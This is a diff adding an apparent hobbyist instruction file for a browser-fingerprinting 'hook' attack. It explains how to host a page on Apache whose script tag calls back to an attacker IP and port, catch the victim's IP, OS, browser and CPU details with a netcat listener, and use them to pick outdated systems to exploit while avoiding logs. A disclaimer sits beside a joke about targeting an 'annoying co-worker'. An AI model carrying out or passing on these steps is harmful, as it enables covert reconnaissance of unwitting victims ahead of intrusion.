@@ -1,0 +1,61 @@
+#NOTE!!!!! ADD ALL FILES FROM THE simple-html-hook-script  TO THE /var/www/html DIRECTORY!!!!!!!!!!!! 
+
+#hey you, yeah you!! PLEASE..... Don't use this for Malicious Purpose's, and if you do, I'm not liable for anything that may happen!!
+
+#REMEMBER HACKING IS ILLEGAL!!!!!!!!!!!!!!
+ 
+#NOTE, THIS ATTACK WILL ONLY WORK IF YOU ARE ON THE SAME NETWORK AS THE VICTIM!!!!!!! YOU CAN MAKE IT ACCESSIBLE TO PEOPLE OUTSIDE THE YOUR NETWORK -
+#BUT IS NOT RECCONMENDED FOR SECURITY REASONS!!!!!!!!!!!
+
+#THIS ATTACK WILL GIVE YOU THE VICTIMS IP ADDRESS, OS VERSION, BROWSER VERSION AND INCLUDING CPU STATS!!!!!!!!!
+
+#THIS ATTACK IS GOOD FOR FINDING OUTDATED SYSTEMS AND BROWSERS TO EXPLOIT WITHOUT SCANNING THE VICTIMS COMPUTER OR NETWORK.....
+
+#add this script to the /var/www/html directory before running 
+
+#NOTE!!!!! IN THE index.html file, YOU CAN CHANGE THE IMAGE DISPLAYED....
+
+#1.In order to use this you are going to have to change the Ip address in the html script to your  or the Attacker IP address,
+
+#2. Also you will change the port number acording to the port "you" or the "Attacker" is listening from,
+
+#Here's an example.... 
+
+<script "http://Your Ip Address:Port Number/ " > </script>
+
+#After you finish editing the index.html file, you will need to have "Netcat" installed, depending on your system, research how to install it. 
+
+#after you installed netcat, you are ready to start!!!!!!! 
+
+#Example......
+
+        sudo nc -lnvp portnumber 
+
+#PLEASE the Port Number you edited in the index.html file, use that for the netcat listener,
+
+#after this command, your computer is now listning to anything coming to the port you selected!!!!!!
+
+#Now run this command 
+
+
+        sudo service apache2 start
+
+#after this you now have a web server running on you machine, I always like checking with a simple nmap scan.
+
+
+        sudo nmap "your ip address" 
+
+#Running that command will make sure your webserver is actually up, 
+
+#now in your browser window, type the IP address you edited in the index.html file 
+
+#if everything was done right you should now see the Black screen with green words "you have been hacked!!!!!!"
+
+#if you switch back to the terminal where your netcat listner is running, you should now see your exposed system information
+
+#this info is good to know what (OS) or Operating System the victim is runnig without causing suspicious traffick or creating logs on a network  
+
+#With PERMISSION!!!! use this against friends, family, or that annoying CO-Worker :)
+
+# - JOSH
+
